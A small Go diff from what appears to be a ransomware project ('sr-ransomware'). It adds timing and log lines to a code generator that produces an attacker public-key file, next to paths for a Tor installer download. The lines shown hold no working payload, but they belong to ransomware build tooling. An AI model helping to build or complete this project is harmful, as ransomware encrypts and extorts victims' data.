@@ -5,6 +5,7 @@ import (
     "io"
     "fmt"
     "log"
+    "time"
     "os/exec"
     "net/http"
     "io/ioutil"
@@ -18,6 +19,10 @@ var torExePath = filepath.Join(workdir, "TorInstaller.exe")
 var torZipPath = filepath.Join(workdir, "Tor.zip")
 
 func main() {
+    t := time.Now()
+    log.Println("> Generating github.com/sug0/sr-ransomware/go/crypto/scheme/attacker/public.go")
+    defer log.Printf("< Completed in %s\n", time.Since(t))
+
     if _, err := os.Stat("tor_buffer.go"); err == nil {
         return
     }
